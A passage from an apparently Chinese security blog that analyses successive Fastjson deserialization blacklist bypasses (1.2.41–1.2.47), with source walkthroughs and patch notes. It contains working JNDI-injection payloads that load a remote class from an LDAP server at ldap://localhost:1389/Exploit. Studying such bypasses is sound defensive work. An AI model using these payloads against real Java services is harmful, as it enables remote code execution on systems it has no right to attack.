&#123;</span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123; <span class="comment">// 检查类是否在预期类中</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">this</span>.autoTypeSupport) &#123;</span><br><span class="line">                    <span class="keyword">for</span>(mask = <span class="number">0</span>; mask &lt; <span class="built_in">this</span>.denyList.length; ++mask) &#123;</span><br><span class="line">                        accept = <span class="built_in">this</span>.denyList[mask];</span><br><span class="line">                        <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span>(mask = <span class="number">0</span>; mask &lt; <span class="built_in">this</span>.acceptList.length; ++mask) &#123;</span><br><span class="line">                        accept = <span class="built_in">this</span>.acceptList[mask];</span><br><span class="line">                        <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                                clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">return</span> clazz;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">false</span>); <span class="comment">// 在这一步进行只爱之前loadCLass()</span></span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                ...</span><br></pre></td></tr></table></figure>

<h3 id="1-2-41漏洞"><a href="#1-2-41漏洞" class="headerlink" title="1.2.41漏洞"></a>1.2.41漏洞</h3><blockquote>
<p>针对1.2.24版本漏洞补丁的绕过</p>
</blockquote>
<p><strong>客户端</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p>只需在<code>@type</code>字段的首尾加多一个<code>L</code>和<code>;</code></p>
<p><strong>分析</strong></p>
<p>很粗暴的绕过方式，看过上面1.2.24版本的补丁可以知道，Fastjson会把对类名的修正（删除一些多余的描述符）放在了检查黑白名单的代码之后，这是个经典的<strong>TOCTOU漏洞</strong>，具体代码如下</p>
<p>在<code>com/alibaba/fastjson/util/TypeUtils.java</code>中的<code>loadClass()</code>方法中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TypeUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="type">boolean</span> cache) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className != <span class="literal">null</span> &amp;&amp; className.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; clazz = (Class)mappings.get(className);</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">                Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">                <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123; <span class="comment">// 绕过的条件</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">            &#125; </span><br><span class="line">            </span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>

<p>在该方法中有两处字符检查，第一处的作用是匹配以<code>&#39;[&#39;</code>开头的字符串，而第二处则是匹配以”L”开头，以”;”结尾的字符串</p>
<p><code>[LAutoTypeTest.ForTest;</code>这种类型的字符串其实是一种对函数返回值和参数的编码，名为<strong>JNI字段描述符</strong></p>
<p>其中首个字符”[“用以表示数组的层数，而第二个字符则代表数组的类型。</p>
<blockquote>
<p>这里举例说明一下JNI字段描述符的格式：</p>
<ol>
<li><p>double对应的类对象名为”[[D”</p>
</li>
<li><p>int[]对应的类对象名则为”[I”</p>
</li>
<li><p>AutoTypeTest.ForTest[]对应的类对象名则为”[LAutoTypeTest.ForTest;”</p>
</li>
</ol>
<p>而L为类描述符，”L”与”;”之间的字符串表示着该类对象的所属类（AutoTypeTest.ForTest）</p>
</blockquote>
<p><strong>Patch</strong></p>
<p>限制传入的类名长度，引入了黑名单加密混淆机制，将所有类型检验换成了<code>hashCode</code>，为了不让研究人员直接看到被明文黑白名单（但是可以爆破绕过，详细的可以看文章底下的<strong>哈希黑名单</strong>），然后在检验黑白名单之前先去掉首尾的<code>&quot;L&quot;</code>和<code>&quot;;&quot;</code></p>
<h3 id="1-2-42漏洞"><a href="#1-2-42漏洞" class="headerlink" title="1.2.42漏洞"></a>1.2.42漏洞</h3><blockquote>
<p>绕过1.2.41的补丁</p>
</blockquote>
<p><strong>客户端</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p>直接再套多一层<code>&quot;L&quot;</code>和<code>&quot;;&quot;</code>即可绕过补丁</p>
<p><strong>分析</strong></p>
<p>跟进<code>checkAutoType()</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeName.length() &lt; <span class="number">128</span> &amp;&amp; typeName.length() &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">            Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> -<span class="number">3750763034362895579L</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">1099511628211L</span>;</span><br><span class="line">            <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="type">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123; <span class="comment">// 经过动态调试可以知道这里是去掉了一层&quot;L&quot;和&quot;;&quot;</span></span><br><span class="line">                className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>

<p><strong>Patch</strong></p>
<p>className开头是<code>&quot;LL&quot;</code>就抛出错误</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeName.length() &lt; <span class="number">128</span> &amp;&amp; typeName.length() &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">            Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> -<span class="number">3750763034362895579L</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">1099511628211L</span>;</span><br><span class="line">            <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="type">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655656408941810501L</span>) &#123; <span class="comment">// 检验开头是否为&quot;LL&quot;，然后抛出错误</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-43漏洞"><a href="#1-2-43漏洞" class="headerlink" title="1.2.43漏洞"></a>1.2.43漏洞</h3><blockquote>
<p>绕过1.2.42的补丁</p>
</blockquote>
<p><strong>客户端</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:false&#125;]&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p>采用畸形<code>&quot;[&quot;</code>和<code>&quot;&#123;&quot;</code>进行绕过</p>
<p><strong>分析</strong></p>
<p>大家应该记得，除了前面用到的<code>&quot;L&quot;</code>和<code>&quot;;&quot;</code>，我们还会对首位的<code>&quot;[&quot;</code>进行修改，再一次看<code>loadClass()</code>函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TypeUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="type">boolean</span> cache) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className != <span class="literal">null</span> &amp;&amp; className.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; clazz = (Class)mappings.get(className);</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">                Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader); <span class="comment">// 删掉首位的&quot;[&quot;</span></span><br><span class="line">                <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass(); <span class="comment">// 实例化类</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>

<p>在Lexer分析完类名之后，此时Lexer已经分析到这个位置<code>[&#123;&quot;dataSourceName&quot;...</code>，而且代码将会检查token为16时后一个预期字符</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// public final Object parseObject(Map object, Object fieldName)</span></span><br><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    typeName = lexer.scanSymbol(<span class="built_in">this</span>.symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!lexer.isEnabled(Feature.IgnoreAutoType)) &#123;</span><br><span class="line">        strValue = <span class="literal">null</span>;</span><br><span class="line">        Class clazz;</span><br><span class="line">        <span class="keyword">if</span> (object != <span class="literal">null</span> &amp;&amp; object.getClass().getName().equals(typeName)) &#123;</span><br><span class="line">            clazz = object.getClass();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            clazz = <span class="built_in">this</span>.config.checkAutoType(typeName, (Class)<span class="literal">null</span>, lexer.getFeatures());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            lexer.nextToken(<span class="number">16</span>); <span class="comment">// 检查expect为16的token</span></span><br><span class="line">            <span class="keyword">if</span> (lexer.token() == <span class="number">13</span>) &#123;</span><br><span class="line">                lexer.nextToken(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// public final void nextToken(int expect)</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.token = <span class="number">16</span>;</span><br><span class="line">        <span class="built_in">this</span>.next();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.token = <span class="number">13</span>;</span><br><span class="line">        <span class="built_in">this</span>.next();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;]&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.token = <span class="number">15</span>;</span><br><span class="line">        <span class="built_in">this</span>.next();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="number">26</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.token = <span class="number">20</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">this</span>.ch != <span class="string">&#x27; &#x27;</span> &amp;&amp; <span class="built_in">this</span>.ch != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; <span class="built_in">this</span>.ch != <span class="string">&#x27;\r&#x27;</span> &amp;&amp; <span class="built_in">this</span>.ch != <span class="string">&#x27;\t&#x27;</span> &amp;&amp; <span class="built_in">this</span>.ch != <span class="string">&#x27;\f&#x27;</span> &amp;&amp; <span class="built_in">this</span>.ch != <span class="string">&#x27;\b&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.nextToken(); <span class="comment">// 因为我们的payload的类名的后一个字符为&#x27;[&#x27;，所以会调用nextToken()函数设置新的token</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line"><span class="comment">// public final void nextToken() </span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">    <span class="built_in">this</span>.next();</span><br><span class="line">    <span class="built_in">this</span>.token = <span class="number">14</span>; <span class="comment">// 将token设置为14</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure>

<p>下面阐述一下为什么一定要把token设置为14</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// public final Object parseObject(Map object, Object fieldName)</span></span><br><span class="line"><span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> <span class="built_in">this</span>.config.getDeserializer(clazz);</span><br><span class="line">thisObj = deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName); <span class="comment">// 进入反序列化</span></span><br><span class="line"><span class="keyword">return</span> thisObj;</span><br><span class="line"></span><br><span class="line"><span class="comment">// public &lt;T&gt; T deserialze(DefaultJSONParser parser, Type type, Object fieldName)</span></span><br><span class="line"><span class="type">JSONArray</span> <span class="variable">array</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">parser.parseArray((Type)componentType, array, fieldName); <span class="comment">// 解析类成员</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.toObjectArray(parser, componentClass, array);</span><br><span class="line"></span><br><span class="line"><span class="comment">// public void parseArray(Type type, Collection array, Object fieldName)</span></span><br><span class="line"><span class="keyword">if</span> (token != <span class="number">14</span>) &#123; <span class="comment">// token不等于14就会报错</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;exepct &#x27;[&#x27;, but &quot;</span> + JSONToken.name(token) + <span class="string">&quot;, &quot;</span> + <span class="built_in">this</span>.lexer.info());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (Integer.TYPE == type) &#123;</span><br><span class="line">        deserializer = IntegerCodec.instance;</span><br><span class="line">        <span class="built_in">this</span>.lexer.nextToken(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (String.class == type) &#123;</span><br><span class="line">        deserializer = StringCodec.instance;</span><br><span class="line">        <span class="built_in">this</span>.lexer.nextToken(<span class="number">4</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        deserializer = <span class="built_in">this</span>.config.getDeserializer(type);</span><br><span class="line">        <span class="built_in">this</span>.lexer.nextToken(((ObjectDeserializer)deserializer).getFastMatchToken()); <span class="comment">// getFastMatchToken()返回的是12，可以成功搜索到下一个字符是&#x27;&#123;&#x27;，对应的token设置为12</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">ParseContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.context;</span><br><span class="line">    <span class="built_in">this</span>.setContext(array, fieldName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="built_in">this</span>.lexer.token() == <span class="number">16</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.lexer.nextToken();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.lexer.token() == <span class="number">15</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Object val;</span><br><span class="line">            <span class="keyword">if</span> (Integer.TYPE == type) &#123;</span><br><span class="line">                val = IntegerCodec.instance.deserialze(<span class="built_in">this</span>, (Type)<span class="literal">null</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">                array.add(val);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (String.class == type) &#123;</span><br><span class="line">                String value;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.lexer.token() == <span class="number">4</span>) &#123;</span><br><span class="line">                    value = <span class="built_in">this</span>.lexer.stringVal();</span><br><span class="line">                    <span class="built_in">this</span>.lexer.nextToken(<span class="number">16</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="built_in">this</span>.parse();</span><br><span class="line">                    <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">                        value = <span class="literal">null</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        value = obj.toString();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                array.add(value);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.lexer.token() == <span class="number">8</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.lexer.nextToken();</span><br><span class="line">                    val = <span class="literal">null</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    val = ((ObjectDeserializer)deserializer).deserialze(<span class="built_in">this</span>, type, i); <span class="comment">// 因为token是12，所以最终会走到这一步完成反序列化</span></span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p><strong>Patch</strong></p>
<p>判断类型的第一个字符是否为”[“</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeName.length() &lt; <span class="number">128</span> &amp;&amp; typeName.length() &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">            Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> -<span class="number">3750763034362895579L</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">1099511628211L</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span>;</span><br><span class="line">            <span class="keyword">if</span> (h1 == -<span class="number">5808493101479473382L</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName); <span class="comment">// 第一个字符是否为&quot;[&quot;则抛出错误</span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-45漏洞"><a href="#1-2-45漏洞" class="headerlink" title="1.2.45漏洞"></a>1.2.45漏洞</h3><blockquote>
<p>利用了一条黑名单中不包含的元素，从而绕过了黑名单限制，需要额外安装mybatis库</p>
</blockquote>
<p><strong>客户端</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p>JndiDataSourceFactory不在黑名单中，通过指定data_source实现JNDI注入</p>
<p><strong>分析</strong></p>
<p>直接放图</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105241715d814a1a9336319d4f794.png" alt="image-20210524170435859" style="zoom:80%;" />

<p>从这个代码可以看到也可以用<code>initial_context</code>属性，但是还要同时设置<code>data_source</code>属性才能用，所以就没什么必要</p>
<p><strong>Patch</strong></p>
<p>扩充了不少黑名单</p>
<h3 id="1-2-47漏洞"><a href="#1-2-47漏洞" class="headerlink" title="1.2.47漏洞"></a>1.2.47漏洞</h3><blockquote>
<p>使用新的Gadget绕过黑名单</p>
<p>需要 1.2.33 ≤ Fastjson版本 ≤ 1.2.47，是否开启setAutoTypeSupport都能成功</p>
<p>需要 1.2.25 ≤ Fastjson版本 ≤ 1.2.32，关闭setAutoTypeSupport能成功</p>
</blockquote>
<p><strong>客户端</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

